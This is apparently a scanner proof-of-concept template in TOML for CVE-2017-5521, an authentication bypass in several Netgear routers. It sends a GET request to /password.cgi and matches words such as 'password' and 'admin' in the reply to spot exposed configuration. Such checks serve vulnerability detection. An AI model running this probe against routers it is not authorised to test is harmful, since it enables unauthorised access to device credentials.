[info]
author = "ave"
description = "Netgear 多款路由器存在认证绕过漏洞，通过发送空密码参数可绕过登录验证，获取设备配置信息"
id = "POC-AVE-2017-0708"
name = "Netgear Router Authentication Bypass PoC"
severity = "medium"
tags = [
    "ave-2017-0708",
    "cve-2017-5521",
]
vuln_id = [
    "CVE-2017-5521",
    "AVE-2017-0708",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/password.cgi"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "enable",
    "password",
    "admin",
]
